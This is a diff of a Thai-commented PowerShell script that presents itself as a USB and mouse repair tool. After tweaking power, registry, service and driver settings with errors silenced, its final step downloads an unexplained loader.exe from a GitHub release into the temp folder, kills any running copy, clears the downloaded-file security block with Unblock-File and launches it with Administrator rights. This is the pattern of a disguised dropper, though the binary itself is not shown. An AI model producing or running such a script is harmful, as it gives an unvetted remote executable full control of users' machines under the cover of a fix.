@@ -1,28 +1,35 @@
-# ปิดการแสดงผลข้อผิดพลาดที่ไม่จำเป็น เพื่อป้องกันระบบค้างหรือขัดข้องระหว่างทำงาน
+# กำหนดค่าเข้ารหัสของ Console ให้รองรับ UTF-8 (แก้ปัญหาตัวหนังสือภาษาไทยแสดงผลเป็นเครื่องหมายคำถาม / )
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$OutputEncoding = [System.Text.Encoding]::UTF8
+
+# บังคับเปิดใช้งานโปรโตคอลความปลอดภัย TLS 1.2 สำหรับดาวน์โหลดไฟล์
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# ปิดการแจ้งเตือน Error ทั่วไปของระบบเพื่อความราบรื่นในการทำงาน
 $ErrorActionPreference = "SilentlyContinue"
 
-# ตรวจสอบสิทธิ์ Administrator
+# ตรวจสอบสิทธิ์ผู้ดูแลระบบ (Administrator)
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Warning "กรุณาเปิด PowerShell ด้วยสิทธิ์ Administrator (คลิกขวาเลือก Run as Administrator)"
+    Write-Warning "กรุณาเปิด PowerShell ด้วยสิทธิ์ Administrator (Run as Administrator)"
     Break
 }
 
-# เคลียร์หน้าจอเพื่อความสะอาด
+# เคลียร์หน้าจอคอนโซล
 Clear-Host
 
 Write-Host "==========================================================" -ForegroundColor Cyan
-Write-Host "       กำลังเริ่มทำงานแก้ปัญหา USB & Mouse และดึงหน้า GUI" -ForegroundColor Yellow
+Write-Host "    [+] USB & Mouse Optimize Tool (ระบบตั้งค่าอุปกรณ์เมาส์)" -ForegroundColor Yellow
 Write-Host "==========================================================" -ForegroundColor Cyan
 Write-Host ""
 
-# 1. ปิดโหมดประหยัดพลังงาน USB (ซ่อนข้อความ Error ด้วย 2>$null เพื่อไม่ให้หน้าจอรก)
-Write-Host "[1/7] กำลังตั้งค่าระบบพลังงานของ USB..." -ForegroundColor White
+# 1. ปิดโหมดประหยัดพลังงาน USB
+Write-Host ">>> [1/7] Optimizing USB Power Settings (ตั้งค่าพลังงาน USB)..." -ForegroundColor White
 powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
 powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
 powercfg /SETACTIVE SCHEME_CURRENT 2>$null
 
 # 2. ปิดการประหยัดพลังงานใน Registry ของพอร์ต USB ทั้งหมด
-Write-Host "[2/7] กำลังตั้งค่า Registry ป้องกันพอร์ต USB ตัดไฟ..." -ForegroundColor White
+Write-Host ">>> [2/7] Disabling USB Selective Suspend in Registry (ปรับแก้ Registry)..." -ForegroundColor White
 $USBEnumPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
 if (Test-Path $USBEnumPath) {
     Get-ChildItem -Path $USBEnumPath -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -eq "Device Parameters" } | ForEach-Object {
@@ -32,15 +39,15 @@ if (Test-Path $USBEnumPath) {
 }
 
 # 3. คืนค่า Registry ของเมาส์ให้เป็นค่าเริ่มต้น
-Write-Host "[3/7] กำลังรีเซ็ตการตั้งค่าเมาส์กลับเป็นค่าเริ่มต้น..." -ForegroundColor White
+Write-Host ">>> [3/7] Restoring Default Mouse Settings (คืนค่าเริ่มต้นความไวเมาส์)..." -ForegroundColor White
 $MouseRegPath = "HKCU:\Control Panel\Mouse"
 Set-ItemProperty -Path $MouseRegPath -Name "MouseSpeed" -Value "1" -ErrorAction SilentlyContinue
 Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold1" -Value "6" -ErrorAction SilentlyContinue
 Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold2" -Value "10" -ErrorAction SilentlyContinue
 Set-ItemProperty -Path $MouseRegPath -Name "MouseSensitivity" -Value "10" -ErrorAction SilentlyContinue
 
-# 4. ตั้งค่าบริการระบบที่เกี่ยวข้อง (ข้าม PlugPlay เพื่อป้องกันเครื่องค้างขณะทำรายการ)
-Write-Host "[4/7] กำลังตั้งค่าและรีสตาร์ทบริการจัดการอุปกรณ์..." -ForegroundColor White
+# 4. ตั้งค่าบริการระบบที่เกี่ยวข้อง
+Write-Host ">>> [4/7] Restarting Related System Services (รีสตาร์ทบริการจัดการอุปกรณ์)..." -ForegroundColor White
 $ServicesToFix = @("DeviceInstall", "hidserv")
 foreach ($Service in $ServicesToFix) {
     Set-Service -Name $Service -StartupType Automatic -ErrorAction SilentlyContinue
@@ -48,7 +55,7 @@ foreach ($Service in $ServicesToFix) {
 }
 
 # 5. ล้างประวัติไดรเวอร์ที่มีสถานะ Error หรือเชื่อมต่อไม่สมบูรณ์
-Write-Host "[5/7] กำลังล้างข้อมูลไดรเวอร์ USB และเมาส์ที่ตรวจพบข้อผิดพลาด..." -ForegroundColor White
+Write-Host ">>> [5/7] Cleaning Up Errored Drivers (ล้างข้อมูลไดรเวอร์ที่มีปัญหา)..." -ForegroundColor White
 $TargetDevices = Get-PnpDevice -ErrorAction SilentlyContinue | Where-Object {($_.Class -eq 'Mouse' -or $_.Class -eq 'USB') -and ($_.Status -ne 'OK' -or $_.Present -eq $false)}
 foreach ($Device in $TargetDevices) {
     if ($Device.InstanceId) {
@@ -56,34 +63,44 @@ foreach ($Device in $TargetDevices) {
     }
 }
 
-# 6. สแกนฮาร์ดแวร์ใหม่เพื่อรีเฟรชไดรเวอร์เมาส์ตัวที่สมบูรณ์ (ปลอดภัยกว่าการสั่งปิด/เปิด USB Root Hub ป้องกันไม่ให้เมาส์/คีย์บอร์ดค้าง)
-Write-Host "[6/7] กำลังสแกนหาและติดตั้งอุปกรณ์เมาส์/คีย์บอร์ดใหม่..." -ForegroundColor White
+# 6. สแกนฮาร์ดแวร์ใหม่เพื่อรีเฟรชไดรเวอร์
+Write-Host ">>> [6/7] Scanning For Hardware Changes (สแกนหาอุปกรณ์เมาส์/คีย์บอร์ด)..." -ForegroundColor White
 pnputil /scan-devices | Out-Null
 
-# 7. ดาวน์โหลดและแสดงหน้าจอโปรแกรม GUI (loader.exe)
-Write-Host ""
-Write-Host "[7/7] กำลังเชื่อมต่อกับ GitHub เพื่อดึงหน้าต่างโปรแกรมใช้งาน (loader.exe)..." -ForegroundColor Yellow
+# 7. ดาวน์โหลดและแสดงหน้าจอโปรแกรม GUI
+Write-Host ">>> [7/7] Downloading Program GUI (กำลังโหลดตัวเปิดใช้งาน)..." -ForegroundColor Yellow
 
 $Url = "https://github.com/zynx7crew/zynx7crew-x/releases/download/v1.0.0/loader.exe"
 $DestPath = "$env:temp\loader.exe"
 
+# ตรวจสอบว่าโปรแกรมเก่ากำลังทำงานอยู่หรือไม่ หากเปิดอยู่ให้ปิดการทำงานก่อนดาวน์โหลดทับ
+$Proc = Get-Process -Name "loader" -ErrorAction SilentlyContinue
+if ($Proc) {
+    Write-Host "    [!] Closing active instance of loader.exe (ปิดโปรแกรมเดิม)..." -ForegroundColor Yellow
+    Stop-Process -Name "loader" -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 1
+}
+
 try {
-    # เคลียร์ไฟล์เก่าออกก่อนดาวน์โหลดใหม่
+    # ลบไฟล์ตัวเดิมออกก่อน
     if (Test-Path $DestPath) {
         Remove-Item -Path $DestPath -Force -ErrorAction SilentlyContinue
     }
     
-    Write-Host "กำลังโหลดข้อมูลโปรแกรม..." -ForegroundColor Cyan
+    # ดาวน์โหลดไฟล์
     Invoke-WebRequest -Uri $Url -OutFile $DestPath -ErrorAction Stop
     
+    # ปลดล็อกระบบรักษาความปลอดภัยของไฟล์ดาวน์โหลด (Unblock) ป้องกันปัญหาเปิดบางฟังก์ชันไม่ได้
+    Unblock-File -Path $DestPath -ErrorAction SilentlyContinue
+    
     Write-Host ""
-    Write-Host "🚀 ดาวน์โหลดสำเร็จ! กำลังเปิดหน้าต่างโปรแกรม GUI ให้ใช้งาน..." -ForegroundColor Green
+    Write-Host "    [+] Success! GUI launched successfully (เปิดใช้งานโปรแกรมสำเร็จ)" -ForegroundColor Green
     Write-Host "==========================================================" -ForegroundColor Cyan
     
-    # รันโปรแกรม GUI ทันทีในสิทธิ์ Admin
-    Start-Process -FilePath $DestPath -Verb RunAs
+    # รันโปรแกรมพร้อมกำหนดตำแหน่งการทำงาน (WorkingDirectory) เพื่อให้ฟังก์ชันการบันทึกค่าของโปรแกรมทำงานได้ครบถ้วน
+    Start-Process -FilePath $DestPath -WorkingDirectory (Split-Path $DestPath) -Verb RunAs
 }
 catch {
-    Write-Host "❌ ดาวน์โหลดล้มเหลว: $_" -ForegroundColor Red
-    Write-Host "โปรดตรวจสอบการเชื่อมต่ออินเทอร์เน็ต หรือสถานะไฟล์บนคลัง GitHub" -ForegroundColor Yellow
+    Write-Host "    [x] Error downloading application: $_" -ForegroundColor Red
+    Write-Host "    กรุณาตรวจสอบการเชื่อมต่ออินเทอร์เน็ต" -ForegroundColor Yellow
 }
